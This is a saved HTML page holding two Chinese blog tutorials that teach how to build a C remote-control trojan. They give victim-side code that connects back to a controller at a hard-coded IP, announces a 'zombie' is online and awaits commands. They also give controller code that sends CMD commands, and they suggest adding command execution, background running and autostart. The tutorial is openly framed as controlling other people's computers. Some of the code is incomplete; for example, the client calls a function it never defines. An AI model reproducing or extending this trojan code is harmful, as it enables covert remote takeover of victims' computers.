@@ -1,0 +1,531 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<base target="_blank" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<script type="text/javascript">
+var userAgent = navigator.userAgent.toLowerCase();
+var browser = 
+	(browser = userAgent.match(/qqbrowser\/([\d.]+)/))?"qqbrowser/"+browser[1]:
+	(browser = userAgent.match(/se\s+2.x/))?"sogou/2.x": //sougou
+	(browser = userAgent.match(/msie\s+([\d.]+)/))?"msie/"+browser[1]: //ie
+	(browser = userAgent.match(/chrome\/([\d.]+)/))?"chrome/"+browser[1]: //chrome
+	(browser = userAgent.match(/firefox\/([\d.]+)/))?"firefox/"+browser[1]: //firefox
+	(browser = userAgent.match(/version\/([\d.]+)\s+safari\/([\d.]+)/))?"safari/"+browser[1]: //safari
+	(browser = userAgent.match(/opera\/([\d.]+)([\w\W]+)version\/([\d.]+)/))?"opera/"+browser[3]: //opera
+	"other browser";
+	var browser4 = browser.substr(0,2);
+//实现回到页面顶部  
+function goTopEx(){  
+	var obj=document.getElementById("goTopBtn"); 
+	var obj2=document.getElementById("shangy"); 
+	var obj3=document.getElementById("xiay");
+	var obj4=document.getElementById("goBottom");  
+	
+	function getScrollTop(){  
+		if(browser4=="ch"){
+			//chrome
+			//chrome63.0.3239.132对DTD XHTML 1.0不再支持body.scrollTop属性，只支持documentElement.scrollTop 
+			return document.documentElement.scrollTop; 
+		}else{
+			//IE、firefox
+			return document.documentElement.scrollTop;  
+		}  
+	}
+	function setScrollTop(value){ 
+		if(browser4=="ch"){ 
+			//chrome
+			document.documentElement.scrollTop=value; 
+		}else{  
+			//IE、firefox
+			document.documentElement.scrollTop=value;  
+		} 
+	}     
+	window.onscroll=function(){getScrollTop()>50?obj.style.display="":obj.style.display="none";
+	getScrollTop()>100?obj2.style.display="":obj2.style.display="none";
+	document.body.clientHeight-getScrollTop()>650?obj3.style.display="":obj3.style.display="none";
+	document.body.clientHeight-getScrollTop()>650?obj4.style.display="":obj4.style.display="none";
+	}  
+	obj.onclick=function(){  
+		var goTop=setInterval(scrollMove,10);  
+		function scrollMove(){  
+				setScrollTop(getScrollTop()/1.1);  
+				if(getScrollTop()<1)clearInterval(goTop);  
+		}  
+	}  
+}  
+function downn(){
+	if(browser4=="ch"){
+		//chrome
+		window.scrollBy(0,document.body.clientHeight);
+	}else{
+		//IE、firefox
+		window.scrollBy(0,document.documentElement.clientHeight*1000); 
+	}
+}
+</script>
+<script>
+function changePage(){ 
+	var page = document.getElementById("container");
+	page.style.background="black";
+	page.style.color="white";
+	page.style.fontSize="22px";
+	page.style.fontFamily="MV boli";
+}
+document.write('<div style="position:fixed; right: 10px; top:20px; color:#eee;">背景颜色<br><select name=bcolor id=bcolor onchange="javascript:document.body.style.background=this.options[this.selectedIndex].value;"><option style="background-color: #ffffff" value="#ffffff">白色</option><option style="background-color: #f6f6f6" value="#f6f6f6">银灰</option><option style="background-color: #e4ebf1" value="#e4ebf1">淡蓝</option><option style="background-color: #e6f3ff" value="#e6f3ff">蓝色</option> <option style="background-color: #eeeeee" value="#eeeeee">淡灰</option><option style="background-color: #eaeaea" value="#eaeaea">灰色</option>  <option style="background-color: #e4e1d8" value="#e4e1d8">深灰</option><option style="background-color: #e6e6e6" value="#e6e6e6">暗灰</option><option style="background-color: #eefaee" value="#eefaee">绿色</option><option style="background-color: #ffffed" value="#ffffed">明黄</option><option style="background-color: #333333" value="#333333">黑色</option></select><br>字体颜色<br><select name=txtcolor id=txtcolor onchange="javascript:document.getElementById(\'container\').style.color=this.options[this.selectedIndex].value;"> <option value="#000000">黑色</option><option value="#ff0000" style="color:red;">红色</option><option value="#006600" style="color:green;">绿色</option><option value="#0000ff" style="color:blue;">蓝色</option><option value="#660000" style="color:#006600;">棕色</option><option value="#ffffff">白色</option></select><br>字体大小<br><select name=fontsize id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontSize=this.options[this.selectedIndex].value;"> <option value="12px" >小号</option> <option value="14px" >较小</option> <option value="19px" >中号</option> <option value="19px" >默认</option><option value="22px" >较大</option><option value="25px" >大号</option><option value="35px" >35px</option><option value="45px" >45px</option><option value="55px" >55px</option><option value="65px" >65px</option><option value="75px" >75px</option><option value="85px" >85px</option><option value="95px" >95px</option></select>><br>字体类型<br><select name=fonttype id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontFamily=this.options[this.selectedIndex].value;"> <option value="宋体" >宋体</option> <option value="MV boli" style="font-family:MV boli">MV boli</option> <option value="隶书" style="font-family:隶书">隶书</option> <option value="黑体" style="font-family:黑体">黑体</option><option value="楷体" style="font-family:楷体">楷体</option><option value="幼圆" style="font-family:幼圆">幼圆</option><option value="华文中宋" style="font-family:华文中宋">华文中宋</option><option value="华文行楷" style="font-family:华文行楷">华文行楷</option><option value="微软雅黑" style="font-family:微软雅黑">微软雅黑</option><option value="Arial" style="font-family:Arial">Arial</option><option value="Vrinda" style="font-family:Vrinda">Vrinda</option><option value="Tahoma" style="font-family:Tahoma">Tahoma</option><option value="Courier" style="font-family:Courier">Courier</option><option value="Times" style="font-family:Times">Times</option><option value="Georgia" style="font-family:Georgia">Georgia</option><option value="Lucida" style="font-family:Lucida">Lucida</option></select><br><a onClick="changePage()" target="_self" id="changepage">黑底白字</a></div>');   
+</script>
+<style type="text/css">
+#tbrowser a:linked container a:visited{
+	font-size:18px;
+	text-decoration:none;
+}
+a:link{
+	text-decoration:none;
+	}
+#container{
+	font-size:1.2em;
+	margin:auto;
+	font-family:"宋体";
+	width:65.29%;
+	line-height:1.6em;
+}
+P{
+	margin-top:16px;
+	margin-bottom:16px;
+	text-indent:2em;
+}
+.uls{
+	color:#CC6666;
+	font-weight:bold;
+}
+.uls>ol{
+	list-style:none;
+	font-weight:normal;
+	list-style:lower-latin;
+	color:#000000;
+	line-height:1.3em;
+}
+h2{
+	font-size:20px;
+	font-weight:bold;
+	margin-top:15px;
+	margin-bottom:0px;
+	text-indent:0em;
+}
+
+#goTopBtn, #goBottom, #shangy, #xiay, #ftsize1, #ftsize2, #ftsize3{
+	width: 18px;
+    line-height: 1.2;
+    padding: 5px 0;
+    font-size: 12px;
+    text-align: center;
+    position: fixed;
+	right: 10px;
+    cursor: pointer;
+    filter: Alpha(opacity=30);
+	opacity=.3;
+	font-weight:bold;
+}
+#goTopBtn, #goBottom, #ftsize1, #ftsize3  {
+    background-color:#999;
+    color:#000;
+}
+#shangy, #xiay, #ftsize2{
+    background-color: #bbb;
+    color: #000;
+}
+#ftsize1{
+	bottom:240px;
+}
+#ftsize2{
+	bottom:214px;
+}
+#ftsize3{
+	bottom:188px;
+}
+
+#goTopBtn{
+    bottom: 105px;
+}
+#goBottom {
+    bottom: 30px;
+}
+#shangy {
+    bottom: 80px;
+}
+#xiay {
+    bottom: 55px;
+}
+#goTopBtn:hover, #goBottom:hover, #shangy:hover, #xiay:hover, #ftsize1:hover, #ftsize2:hover, #ftsize3:hover{
+	background-color:#ccc;
+	border:#ccc 0px solid;
+}
+#goTopBtn a:link, #goBottom a:link, #xiay a:link, #shangy a:link, #ftsize1 a:link, #ftsize2 a:link, #ftsize3 a:link {
+	text-decoration: none;
+	color:white;
+}
+img{
+	margin-right:2em;
+	text-indent:2em;
+	border:0;
+}
+.picsay{
+	color:#930;
+	font-size:90%;
+	line-height:110%;
+	margin-top:-12px;
+	padding:0;
+}
+.remark{
+	color:#930;
+	font-size:90%;
+	line-height:140%;
+	margin-top:-12px;
+	text-indent:0em;
+	padding:0;
+}
+.ref{
+	color:#930;
+	font-size:95%;
+	line-height:150%;
+	margin-top:-12px;
+	text-indent:2em;
+	padding:0;
+}
+pre{
+	font-size:120%;
+	line-height:130%;
+	padding:0;
+	//background-color:#f6f6f6;
+	//background-color:#fff5ee;
+	//background-color:#ffe;
+	background-color:#eee;
+	padding:8px;
+	}
+.code0, .code2, .code4{
+	font-size:95%;
+	line-height:110%;
+	margin-top:-12px;
+	padding:0;
+	//background-color:#D9D1CA;
+	//background-color:#f6f6f6;
+	//background-color:#fff5ee;
+	background-color:#ffe;
+}
+.code0{
+	color:red;
+	text-indent:0em;
+}
+.code2{
+	color:#930;
+	text-indent:2em;
+}
+.code4{
+	color:blue;
+	text-indent:4em;
+}
+sub,sup{
+	font-size:80%;
+	color:red;
+}
+</style>
+</head>
+
+<body>
+
+<div id="container">
+
+
+
+
+
+<h4>服务端与客户端编程</h4>
+
+<h4><a href="https://www.toutiao.com/i6597025436432073220/">客户端</a></h4>
+
+
+<p>相信大家都听说计算机木马病毒吧？在很多人眼里，计算机木马都是一种很神秘的存在，悄悄的隐藏在计算机后台运行，监视着计算机的一切行为，能够在无人知晓的情况下拿走敏感文件，并且远在另一端的木马制作者，会通过计算机网络对木马宿主电脑进行控制，而这一切操作木马宿主都无法知晓，那么，木马真的有这么神秘吗？</p>
+
+
+<p>这里，《一碳科技》教大家用C语言编写一个简单的木马程序，这篇文章先教大家编写远程控制木马中的“被控端”，也就是发送给宿主计算机的程序，这个程序比较简单，目的是为了让大家能理清C语言木马的工作原理，只是编写了基本实现远程发送命令的基本框架。</p>
+
+<p>第一步</p>
+
+<p>编写C代码的第一步，引用头文件，这里分别使用stdio.h、WinSock2.h、windwos.h（高大上一点），注意，WinSock2.h要在windwos.h之前引用，否则会出现错误，并且我们还要加入Ws_32.lib这个静态链接库，否则connect()函数就无法使用。</p>
+
+<p>对第一步做个总结：</p>
+
+<p>WinSock2.h要在windwos.h之前引用</p>
+
+<p>加入Ws_32.lib这个静态链接库</p>
+<pre>
+#include<stdio.h>
+#include<WinSock2.h>
+#include<windows.h>
+#pragma comment(lib,"ws2_32.lib")
+</pre>
+
+
+
+
+
+<p>第二步</p>
+
+<p>编写我们连接控制端的函数，在这里会用到socket()函数，recv()函数，WSAStartup()函数、MAKEWORD()函数，HIBYTE()和LOBYTE()函数，这里给大家提一个建议，如果想要学习scoket编程，那么，你就要把socket()、send()、recv()、accept()、listen()、connect()、bind()、这7个函数要学会怎么用并且理解。</p>
+
+<p>第二步的注意事项：</p>
+
+<p>socket API函数调用之前，调用的第一个函数都是WSAStartup()函数。</p>
+
+<p>MAKEWORD()函数几乎都是配合WSAStartup()函数使用，一般情况下，MAKEWORD(）函数的参数分别为：2、2。</p>
+
+<pre>
+SOCKET socket_connet(void)
+{
+	WSADATA wd;
+    SOCKET C;
+	SOCKADDR_IN server_addr;
+	int ret=0;
+	char word[BUFSIZ];
+
+	ret=WSAStartup(MAKEWORD(2,2),&wd);
+
+	if(ret!=0)
+	{
+		  printf("初始化失败");	
+		  Sleep(500);
+		  return NULL;
+	}
+	if(LOBYTE(wd.wVersion)!=2||HIBYTE(wd.wVersion)!=2)
+	{
+		printf("初始化异常！");
+		Sleep(500);
+		WSACleanup();
+		return NULL;
+	}
+</pre>
+<p>初始化完成，我们就要连接服务器了，分别有四个步骤：</p>
+
+<p>1 创建一个套接字</p>
+
+<p>2 填写向SOCKADDR_IN中填写服务器IP地址、端口、使用的协议族（AF_INET）</p>
+
+<p>3 向服务器发送数据，说明“肉鸡”已经上线</p>
+
+<p>4 接收服务器信息</p>
+
+<p>如果想要“被控端”执行服务器的命令，可以自行添加system()函数，这里就不演示了。</p>
+<pre>
+SOCKET socket_connet(void)
+{
+	WSADATA wd;
+    SOCKET C;
+	SOCKADDR_IN server_addr;
+	int ret=0;
+	char word[BUFSIZ];
+
+	ret=WSAStartup(MAKEWORD(2,2),&wd);
+
+	if(ret!=0)
+	{
+		  printf("初始化失败");	
+		  Sleep(500);
+		  return NULL;
+	}
+	if(LOBYTE(wd.wVersion)!=2||HIBYTE(wd.wVersion)!=2)
+	{
+		printf("初始化异常！");
+		Sleep(500);
+		WSACleanup();
+		return NULL;
+	}
+	
+	//连接服务器
+    C=socket(AF_INET,SOCK_STREAM,0);
+
+	//填入控制端地址、端口、协议族
+	server_addr.sin_addr.S_un.S_addr=inet_addr("192.168.0.104");
+	server_addr.sin_family=AF_INET;
+	server_addr.sin_port=htons(6000);
+
+	//连接控制端
+    connect(C,(SOCKADDR *)&server_addr,sizeof(SOCKADDR));//与控制端连接
+
+	//告诉控制端“肉鸡”上线了
+	send(C,"肉鸡已上线，请指示",strlen("肉鸡已上线"),0);
+
+	//接收并执行控制端指令
+	recv_updata(C);
+	system("pause");
+
+	return C;
+}
+</pre>
+<p>好了，写到这里，“被控端”的基本框架已经完成了，剩余的功能可以自行添加，例如执行服务端指令、“被控端”后台执行、“被控端”自启动等功能，这些功能的实现并不难，这里就不多讲了，如果不明白可以私信小编哦！</p>
+
+<p>“被控端”完成了，那么“控制端”在哪呢？别急，下一篇文章会有哦</p>
+
+<p>“控制端”与“被控端”一样，小编只是将基本的框架写出来，能够实现“控制端”与“被控端”的数据交流，控制端能够发送指令，被控端能够接收指令。其余的功能在近期的文章中会教大家如何实现，请关注《一碳科技》！</p>
+
+
+
+<h4><a href="https://www.toutiao.com/i6597600631169483267/">「教学」C语言木马程序：控制别人电脑+附送源码！</a></h4>
+
+<p></p>
+
+<p>这篇文章是上一篇文章《一篇短文教会你！C语言远控木马：被控端制作，附送源码！》的补充，上一篇文章呢，我们给大家讲了C语言远控木马的“被控端”制作方法，而这篇文章呢，《一碳科技》会教大家制作C语言远控木马的“控制端”，并且这篇文章将上一篇文章的“被控端”代码进行重新整理，以便大家能够直观的看到代码的实现过程。</p>
+
+<p>制作控制端其实不难，《一碳科技》发布过的文章《5分钟学会scoket编程！使用SMTP协议发邮件：附送源码+教学！》中就曾教大家如何使用socket通过smtp协议发送邮件，对比之下，控制端就相当于“smtp服务器”，被控端相当于给我们发送“邮件”的用户。</p>
+
+<p>第一步</p>
+
+<p>首先和往常一样，引用我们需要的头文件，这里我们需要4个头文件：stdio.h、string.h、WinSock2.h、windows.h，除此之外，我们还要加入ws2_32.lib链接库。</p>
+
+<p>在这个程序里，我们需要三个函数，他们分别要实现：接受客户端连接、返回客户端数据、绑定本地端口并开始监听的功能，小编分别给他们取名为：accept_client()、recv_updata()、bind_server()，这里可能有人会有一文：“recv()不是可以接收客户端数据吗？为什么还要重新构造一个recv_updata()函数呢？”，别急，下面会讲到。除此之外，我们还要申请一个存放客户端返回数据的变量——char word[BUFSIZ]。</p>
+
+<p>第一步源码</p>
+<pre>
+#include<stdio.h>
+#include<string.h>
+#include<WinSock2.h>
+#include<windows.h>
+#pragma comment(lib,"ws2_32.lib")
+void accept_client(SOCKET C);	//接受客户端连接
+void recv_updata(SOCKET C);		//返回客户端数据
+SOCKET bind_server(void);		//绑定服务器，并开始监听
+char word[BUFSIZ];				//存放客户端反馈数据
+</pre>
+<p>第二步</p>
+
+<p>​我们现在要开始分别构造我们需要的函数了，首先从bind_server()（绑定本地端口并开始监听的功能）开始，这个函数跟往常一样：初始化、创建套接字、服务器信息存入、将套接字与本地端口绑定（这点与之前不同）、开始监听。这里我们讲一下“服务器信息存入”所要用到的两个函数：inet_addr()、htons()。</p>
+<pre>
+server_addr.sin_addr.S_un.S_addr=inet_addr("192.168.2.106");//本机IP地址 自行更换
+server_addr.sin_family=AF_INET;//使用ipv4协议族
+server_addr.sin_port=htons(6000);//将无符号短整型数值转换成网络字节顺序  
+</pre>
+<p>inet_addr()的作用是将点分十进制转换成长整型，什么是点分十进制？IP地址是由四字节的十进制数表示的，每字节的十进制数表示范围为0~255，所以，我们平常看到的IP地址的格式都是：255.255.255.255，而这种格式就叫做点分十进制。那么为什么要将这个点分十进制转换成长整型，而不是其他数据类型呢？我们来看一下server_addr结构体中的S_addr成员，这个成员的数据类型为ULONG，而我们的IP地址信息就存放在S_addr成员中，调用inet_addr()函数的原因就是在这里。</p>
+
+<p>htons()在这里的作用是，将主机字节序转换成网络字节序，一般来说网络字节序（大部分）都是指大端传输，目前，使用小端储存方式的CPU有Intel x86、ARM，而小编所使用的计算机CPU是intel的，所以这里要用htonl()函数，把主机字节序的“小端”转换成网络字节序的“大端”。</p>
+
+<p>什么大端、小端？</p>
+
+<p>“大端”、“小端”指的是计算机存放数据的方式。大端指的是：将高位字节储存在内存的低地址，而小端指的是，将高位字节储存在内存的高地址，如果看不明白这里，建议大家去看一下：计算机内存顺序、高字节与低字节。</p>
+
+<p>inet_addr()函数与htons()函数，是这里比较容易“迷糊”的地方，剩下的函数就不多讲了，因为它们在《一碳科技》之前的文章就曾讲解过。</p>
+
+<p>到这里，bind_server()函数就写好了，接下来给大家讲一下recv_updata()，这里为什么要重新写一个recv()函数呢？因为recv()函数接收的数据，要经过处理才能使用printf()函数打印出来，否则printf()函数打印出来的数据将不是我们想要的数据，例如它会打印出：“烫烫烫烫烫烫烫烫烫烫烫”。</p>
+
+<p>而我们这里用strnest()函数对word变量（第一步声明的变量）进行“加工”，将word数组成员全部用“”代替（相当于初始化），然后recv()开始接收客户端数据，word数组的“”就会按顺序替换成客户端数据，而printf()函数读取到“”就会停止打印。</p>
+
+<p>原先申请的word数组并没有初始化，所以里面会自动填充0xCCCC↓</p>
+
+<p>运行结果</p>
+
+<p>第三步</p>
+
+<p>第三步是制作accept_client()函数，这一步没有特别难理解的地方，这里就不多讲了，各位看官根据源代码进行理解就可以了。</p>
+<pre>
+void accept_client(SOCKET C)
+ {
+    
+	 SOCKET client;//客户端socket
+	 SOCKADDR_IN client_addr;//客户端地址
+	 int len=sizeof(SOCKADDR);///accept()参数
+	 int ret1=0;//判断accept()是否成功
+     char *IP;//客户端IP地址
+	 char str[150]={0};//发送指令 	
+	 int num=0;
+
+	client=accept(C,(SOCKADDR *)&client_addr,&len);//等待客户端连接
+	
+	IP=inet_ntoa(client_addr.sin_addr);
+	printf("%s 连接到控制端\n\n",IP);
+	recv_updata(client);
+	printf("%s\n\n",word);
+	while(1)
+	{
+			printf("请发送指令至客户端：");
+			scanf("%s",str);
+			send(client,str,strlen(str),0);
+			recv_updata(C);
+			printf("%s",word);
+			printf("是否继续发送指令？（是1，否2）\n\n");
+			scanf("%d",&num);
+			system("CLS");
+			if (num==1)
+			{
+				printf("程序继续执行！");
+				Sleep(500);
+				system("CLS");
+ 			}
+			else
+			{
+
+				printf("正在退出......\n\n");
+				closesocket(client);
+				WSACleanup();
+				break;
+	
+			}
+	}//while()
+ 
+ }//accept_client()
+ </pre>
+<p>这是程序运行结果</p>
+
+<p>先开启控制端，然后开启客户端，客户端连接控制端，控制端显示客户端IP地址，之后控制端就可以向客户端发送CMD命令，图中，小编使用write命令打开了客户端的写字板。</p>
+
+<p>​</p>
+
+
+
+
+
+<p style='float:right;'>本页共64段，3558个字符，8390 Byte(字节)</p>﻿
+
+
+
+
+</div>
+
+
+<div>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.4em";' target="_self" style="color:#fff;" title="大：1.4em"><div id="ftsize1" style="color:#fff;">大</div></a>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.2em";' target="_self" style="color:#fff;" title="中：1.2em"><div id="ftsize2" style="color:#fff;">中</div></a>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.0em";' target="_self" style="color:#fff;" title="小：1em"><div id="ftsize3" style="color:#fff;">小</div></a>
+
+<a target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="goTopBtn">&and;</div></a>
+<a onclick="shangy()" target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="shangy">&uarr;</div></a>
+<a onclick="xiay()" target="_self" style="color:#fff;"><div id="xiay" style="color:#fff;">&darr;</div></a>
+<a onclick="downn()" target="_self" style="color:#fff;"><div id="goBottom" style="color:#fff;">&or;</div></a>
+<script type=text/javascript>
+	goTopEx();
+	function xiay(){
+		window.scrollBy(0,window.innerHeight-10);
+	}
+	function shangy(){
+		window.scrollBy(0,-window.innerHeight+10);
+	}
+	var obj3=document.getElementById("xiay");
+	var obj4=document.getElementById("goBottom");
+	function getHeight(){  
+		if(browser4=="ch"){
+			//谷歌浏览器
+			return document.body.clientHeight; 
+		}else{
+			//IE、firefox等浏览器 
+			return document.documentElement.clientHeight;  
+		}  
+	}
+	getHeight()<window.innerHeight+50?obj3.style.display="none":obj3.style.display="";
+	getHeight()<window.innerHeight+50?obj4.style.display="none":obj4.style.display="";
+	if(browser4!="ch"){	//firefox需要尝一下才显示向下图标
+		xiay();
+		shangy();
+	}
+</script>
+</div>
+
+</body>
+</html>
